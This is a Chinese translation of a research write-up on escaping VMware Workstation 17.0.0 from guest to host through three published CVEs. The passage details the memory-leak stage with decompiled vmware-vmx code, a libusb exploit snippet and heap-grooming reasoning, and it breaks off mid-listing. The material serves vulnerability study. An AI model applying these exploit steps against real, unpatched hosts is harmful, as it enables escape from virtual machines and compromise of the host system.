---
title: VMware 17.0.0虚拟机逃逸实践
url: https://mp.weixin.qq.com/s/6XUo_F8elUdsZXWWIFQLLw
source: Doonsec's feed
date: 2026-04-07
fetch_date: 2026-04-08T04:35:08.056161
---

# VMware 17.0.0虚拟机逃逸实践

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Kric7mM9eA5BdrgmSFk6SticVHpiaybTIYXvryWiar2AXEDPzsQ2W4aSAHsvFlrsqsHZ9c8dvicfDJlW2BSttic0UfOpvIibgPGkqCOr1DjaTPCBYc/0?wx_fmt=jpeg)

# VMware 17.0.0虚拟机逃逸实践

Dubito
Dubito

云原生安全指北

![]()

在小说阅读器中沉浸阅读

> 注：本文翻译自 r0keb[1] 的文章《VMware Guest To Host》[2]，可点击文末“阅读原文”按钮查看英文原文。

全文如下：

## 一、引言

早上好！今天我们将完整演示如何在 VMware（版本 17.0.0）中实现从虚拟机（Guest）到宿主机（Host）的漏洞利用。我的实验环境是安装了该版本 VMware 的笔记本电脑，以及 Ubuntu 20.04 LTS。

所使用的漏洞分别为：CVE-2023-20870、CVE-2023-34044 和 CVE-2023-20869。

我**并不是**这些漏洞的发现者（`;(`）。事实上，有一篇长达 107 页的论文非常详细地解释了这些漏洞：

* • https://www.nccgroup.com/media/b2chcbti/vmware-workstation-guest-to-host-escape.pdf

所有功劳归于 Alexander Zaviyalov 的这篇优秀论文，它让我能够以此为指南来尝试利用这些 CVE :D。

需要说明的是，这个过程非常有趣且引人入胜，同时对于理解虚拟机监控程序（hypervisor，本例中是 VMware，但我还计划深入研究 Hyper-V）的研究和漏洞利用过程也是一次极好的训练。

漏洞利用过程如下：

* • **内存泄漏（Memory Leak）**：这对于绕过 ASLR 并获取 `vmware_vmx` 的基地址非常有帮助。为此，我们将利用 USB 请求块（USB Request Blocks，URBs）中一个存在未初始化内存的 `malloc` 函数。
* • **远程代码执行（RCE）**：我们将通过服务发现协议（Service Discovery Protocol，SDP）实现中的栈缓冲区溢出（stack-based buffer overflow）来触发此漏洞。为此，我们需要一个蓝牙设备。在我的尝试中，我在运行 Windows 11 的虚拟机（使用存在漏洞的 VMware 版本）和 Ubuntu 20.04 LTS 环境下都试过。不幸的是，蓝牙设备的直通（passthrough）未能正常工作，因此我决定在笔记本电脑的宿主机操作系统（Host OS）上进行操作。

概念介绍完毕，让我们开始吧。

## 二、泄漏 VMware 基地址

为了实现此次内存泄漏，我们需要两个设备：**虚拟蓝牙适配器（Virtual Bluetooth Adapter）**（读取者）和 **虚拟鼠标（Virtual Mouse）**（写入者）。

鼠标侧和蓝牙侧都使用了未清零的 `malloc`，两者都没有正确清理内存。但它们在漏洞利用中扮演着不同的角色。

### 2.1 虚拟蓝牙适配器（Virtual Bluetooth Adapter）（读取者）

首先，我们将使用 `lsusb` 列出 USB 设备，并记下 **`VID`** 和 **`PID`**：

![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5DgVR8lXxqHdK9M82B8nhurxhouChX5ZvHCrpJbuh9ibAPaOoKOIk3Eryk3MqdU8pdSv94IiaF6TEHafbxjfkpZ3V45ZEp8TFUew/640?from=appmsg "null")

```
uint16_t vid = 0x0e0f;
uint16_t pid = 0x0008;
```

为了实现这次内存泄漏，我们将在代码中使用 `libusb` 发送 URB 数据包。

让我们从头开始，先看存在漏洞的函数：

```
// 当 Guest 发送 USB Request Block 时调用，进行内存分配及读/写数据
VUsbURB *__fastcall VUsbBluetooth_OpNewUrb(VUsbDevice_Bluetooth *dev, unsigned int num_pkts, unsigned int num_bytes)
{
  _QWORD *v5; // rsi
  __int64 v6; // rax
  v5 = UtilSafeMalloc1(12LL * num_pkts + 0xA0);
  v5[0xF] = &unk_14132C238;
  v6 = sub_14081BEA0(*((_QWORD *)dev + 76), num_bytes);
  *v5 = v6;
  v5[0x10] = sub_1408194C0(v6);
  return (VUsbURB *)(v5 + 1);
}
```

一切核心都围绕这个函数中的 **`sub_14081BEA0`**，它是以下代码的封装：

```
__int64 __fastcall sub_14081BEA0(__int64 a1, __int64 a2)
{
  return (__int64)sub_1408194D0(*(_DWORD **)(a1 + 0x268), a2);
}
```

```
_QWORD *__fastcall sub_1408194D0(_DWORD *a1, unsigned int numbytes)
{
  _QWORD *v5; // rcx
  int v6; // edx
  unsigned int v7; // edx
  unsigned int v8; // r8d
  unsigned int v9; // eax
  bool v10; // cc
  unsigned int v11; // eax
  v5 = UtilSafeMalloc1(numbytes + 24LL);
  *(_WORD *)v5 = 0;
  *v5 = (unsigned __int64)(numbytes & 0xFFFFFF) << 16;
  v5[1] = 0;
  v5[2] = a1;
  v6 = a1[16];
  ++a1[14];
  v7 = numbytes + v6;
  v8 = a1[14];
  v9 = a1[15];
  a1[16] = v7;
  v10 = v9 <= v8;
  if ( v9 >= v8 )
  {
    if ( v7 <= a1[17] )
      return v5;
    v10 = v9 <= v8;
  }
  if ( v10 )
    v9 = v8;
  a1[15] = v9;
  v11 = a1[17];
  if ( v11 <= v7 )
    v11 = v7;
  a1[17] = v11;
  return v5;
}
```

如我们所见，这块内存从未被初始化。因此，接下来我们会看到，该缓冲区中可能包含敏感信息。

```
void *__cdecl UtilSafeMalloc1(size_t Size)
{
  void *result; // rax
  result = malloc(Size);
  if ( !result )
  {
    if ( Size )
      unknown_libname_45();
  }
  return result;
}
```

借助 WinDBG，我们将“实时”观察其行为。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5Ac4XEpZG7FHLcMF9LvFqOJiabfpJD2tgpmU0PeudbyCm2qkWVkJKGcayvl0pbw8QDFc3SQgRMwEg8Q1ecctBIf1UibLCLbgdE5E/640?from=appmsg "null")

我们将执行以下操作：

```
// 声明上下文
libusb_context* ctx = NULL;
status = libusb_init(ctx);
...
...
// 使用前述 VID 和 PID 打开设备句柄
libusb_device_handle *hDevice = NULL;
hDevice = libusb_open_device_with_vid_pid(ctx, vid, pid);
...
...
// 重要：分离（Detach）附加到驱动程序的内核驱动
status = libusb_kernel_driver_active(hDevice, 0);
if (status == 1) {
    printf("\n[正在分离内核驱动...]\n");
    libusb_detach_kernel_driver(hDevice, 0);
}
...
...
// 声明一个缓冲区用于接收输出，并发送 libusb_control_transfer
char* dataOut[0x1000];
memset(dataOut, 0, 0x1000);
status = libusb_control_transfer(hDevice,
                                 LIBUSB_REQUEST_TYPE_CLASS | LIBUSB_ENDPOINT_IN,
                                 LIBUSB_REQUEST_GET_STATUS,
                                 0, 0, dataOut, 0x80, 1000);
...
...
// 使用以下 printf 语句获取所收到缓冲区的内容
for (unsigned int i = 0; i < 0x20; i++) {
    printf("\n[%u] address -> 0x%p\n\t\\__Content -> [0x%0.16llx]\n",
           i, (void*)&dataOut[i], (unsigned long long)dataOut[i]);
}
...
...
// 清理
printf("\n[缓冲区发送成功]\n");
libusb_release_interface(hDevice, 0);
libusb_close(hDevice);
hDevice = NULL;
libusb_exit(ctx);
ctx = NULL;
```

你可能会好奇，为什么我们在 **`request_type`** 中使用了 `LIBUSB_REQUEST_TYPE_CLASS | LIBUSB_ENDPOINT_IN`。这是个好问题，因为这正是本次内存泄漏的核心所在，同时 **`bRequest`**（即 `LIBUSB_REQUEST_GET_STATUS`）也是关键。

* • **`request_type`**：

+ • `LIBUSB_ENDPOINT_IN`：它将传输方向设置为“设备 -> 虚拟机（guest）”，意味着宿主机将从 URB 数据缓冲区读取数据，并将其发回给虚拟机操作系统。如果没有这个标志，数据将流向相反方向（虚拟机向设备写入），我们就永远无法收到未初始化的堆内容。整个内存泄漏都依赖于能够获取返回的数据。
+ • `LIBUSB_REQUEST_TYPE_CLASS`：在 `vmware-vmx.exe` 内部，函数 **`VUsbBluetooth_OpSubmitUrb`** 会检查由 `bmRequestType` 派生的操作码（opcode）。当使用 `LIBUSB_REQUEST_TYPE_CLASS | LIBUSB_ENDPOINT_IN` 时，转换后的操作码变为 `AL = 0x20`，这满足了该函数中某个特定的 `IF` 条件。该代码路径会导致进入一个分支，其中未初始化的 URB 数据缓冲区会被处理，并最终以 0x40 字节的块为单位复制回虚拟机的物理内存中（且不进行任何内容初始化）。

* • **`bRequest`**：

+ • `LIBUSB_REQUEST_GET_STATUS`：该值决定了由 `vmware-vmx.exe` 中的哪个具体子处理函数来处理此请求。它会导向这样的代码路径：URB 数据缓冲区的大小直接取自虚拟机可控的 `wLength` 且未经任何审查（sanitization），然后未初始化的缓冲区被返回。

* • **`wLength`**：

+ • `0x80`：它控制着 `malloc` 在宿主机上分配的 URB 蓝牙数据缓冲区的大小（`malloc(0x80 + 0x8 + 0x18) = malloc(0xb0)`）。使用这个值的主要原因是进行堆风水（heap feng shui）。鼠标的 URB 对象（使用 `wLength = 0x0` 分配）会落入大小为 `0xb0` 的 **LFH（Low Fragmentation Heap）** 堆块中。但若使用 `wLength = 0x0`，蓝牙 URB 则会进入 `0x30` 的堆块。将 `wLength` 设置为 `0x80` 可以刚好把蓝牙 URB 的分配大小“撑大”到与鼠标对象相同的 `0xb0` 堆块中。此时，那些已被释放的鼠标对象中，其 `.data` 指针仍然残留在未清零的内存里。

总结一下，我们关注的函数如下：

```
__int64 __fastcall VUsbBluetooth_OpSubmitUrb(VUsbURB *urb)
{
  __int64 v1; // rdx
  int v3; // eax
  _QWORD *v4; // rbp
  __int64 v5; // rbx
  _QWORD *v6; // r8
  __int64 v7; // rsi
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  _WORD *v12; // rax
  __int64 v13; // rdx
  void *v14; // rbx
  char v15; // al
  __int16 v16; // ax
  v1 = *((_QWORD *)urb + 3);
  v3 = *((_DWORD *)urb + 2);
  v4 = (_QWORD *)*((_QWORD *)urb - 1);
  v5 = *((_QWORD *)urb + 15);
  v6 = *(_QWORD **)(v1 + 32);
  v7 = v6[76];
  *((_DWORD *)urb + 22) = 0;
  *((_DWORD *)urb + 3) = v3;
  v8 = *(_DWORD *)(v1 + 12);
  if ( v8 )
  {
    v9 = v8 - 2;
    if ( v9 )
    {
      v10 = v9 - 127;
      if ( !v10 )
        return sub_1407FE130(v6 + 88, (__int64)urb);
      if ( v10 == 1 )
        return sub_1407FE130(v6 + 78, (__int64)urb);
      goto LABEL_24;
    }
    sub_1408194B0(v4);
    v12 = sub_140819670(v4, 0, *((_DWORD *)urb + 2));
    v13 = 2;
    goto LABEL_8;
  }
  if ( (*(_BYTE *)v5 & 0x60) == 0x20 )
  {
    sub_1408194B0(v4);
    v12 = sub_140819670(v4, 8u, *((_DWORD *)urb + 2) - 8);
    v13 = 0;
LABEL_8:
    v14 = v12;
    sub_14081BCD0(v7, v13, v12);
    unref_sdp(v14);
    return (*(__int64 (__fastcall **)(VUsbURB *))(qword_14156D3B8 + 248))(urb);
  }
  if ( VUsbDevice_OpSubmitNonReqCtl(urb) )
    return (*(__int64 (__fastcall **)(VUsbURB *))(qword_14156D3B8 + 248))(urb);
  if ( (*(_BYTE *)v5 & 0x60) != 0 )
    goto LABEL_24;
  v15 = *(_BYTE *)(v5 + 1);
  if ( v15 == 9 )
  {
    if ( *(unsigned __int16 *)(v5 + 2) <= 1u )
    {
      sub_140759340(*(_QWORD *)(*((_QWORD *)urb + 3) + 32LL), *(unsigned __int16 *)(v5 + 2));
      if ( *(_WORD *)(v5 + 2) )
        sub_14081BEB0(v7);
      return (*(__int64 (__fastcall **)(VUsbURB *))(qword_14156D3B8 + 248))(urb);
    }
    goto LABEL_23;
  }
  if ( v15 != 11 )
  {
LABEL_24:
    *((_DWORD *)urb + 22) = 4;
    return (*(__int64 (__fastcall **)(VUsbURB *))(qword_14156D3B8 + 248))(urb);
  }
  v16 = *(_WORD *)(v5 + 4);
  if ( !v16 )
  {
    if ( *(_WORD *)(v5 + 2) )
      *((_DWORD *)urb + 22) = 3;
    return (*(__int64 (__fastcall **)(VUsbURB *))(q...